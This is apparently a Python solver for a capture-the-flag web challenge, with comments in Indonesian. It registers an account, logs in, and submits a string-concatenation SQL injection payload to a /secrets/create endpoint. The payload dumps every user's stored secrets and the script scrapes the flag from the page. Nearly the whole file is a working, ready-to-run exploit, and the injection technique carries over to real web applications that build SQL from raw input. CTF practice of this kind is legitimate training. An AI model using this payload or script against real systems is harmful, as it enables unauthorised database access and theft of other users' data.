#!/usr/bin/env python3
"""Solver for Challenge 747: Secret Box (Web Exploitation, picoCTF 2026).

Audit reproduktif NIST SP 800-115: endpoint POST /secrets/create
menginterpolasi userId dan content langsung ke query SQL (knex raw),
sehingga kolom content dapat diisi ekspresi subquery yang membaca
seluruh tabel secrets milik admin. Butuh lab URL aktif.
"""
import re
import sys
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

FLAG_RE = re.compile(r"academy\{[^}]*\}")


def solve(base_url: str, username: str = "nyawit_solver",
          password: str = "pw123456") -> str:
    base = base_url.rstrip("/")
    cj = CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def post(path: str, data: dict):
        return op.open(base + path,
                       urllib.parse.urlencode(data).encode(), timeout=25)

    post("/signup", {"username": username, "password": password})
    post("/login", {"username": username, "password": password})
    payload = "'||(SELECT string_agg(content,'|') FROM secrets)||'"
    post("/secrets/create", {"content": payload})
    with op.open(base + "/", timeout=25) as resp:
        html = resp.read().decode(errors="ignore")
    m = FLAG_RE.search(html)
    assert m, "flag tidak muncul di daftar secrets"
    return m.group(0)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("pakai: solve_747_secret_box.py <lab-base-url> [username]")
        sys.exit(2)
    user = sys.argv[2] if len(sys.argv) > 2 else "nyawit_solver"
    print("Flag:", solve(sys.argv[1], user))
